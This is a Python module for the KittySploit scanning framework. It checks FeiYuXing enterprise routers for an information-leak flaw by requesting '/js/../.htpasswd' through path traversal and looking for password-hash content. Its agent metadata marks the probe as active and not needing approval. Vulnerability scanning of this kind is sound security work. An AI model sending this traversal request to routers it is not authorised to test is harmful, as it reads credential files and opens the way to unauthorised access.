#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The FeiYuXing Enterprise Router Information Leakage Vulnerability is a critical flaw that allows unauthorized ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FeiYuXing Enterprise Router - Information Leakage Detection',
        'description': 'The FeiYuXing Enterprise Router Information Leakage Vulnerability is a critical flaw that allows unauthorized attackers to retrieve sensitive configuration details from the router.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'feiyuxing', 'info-leak', 'disclosure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
    }

    def run(self):
        r = self.http_request(method="GET", path='/js/../.htpasswd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/plain', 'Router Web',)
        body_all = ('$', ':',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="FeiYuXing Enterprise Router - Information Leakage detected",
                path='/js/../.htpasswd',
            )
            return True
        return False

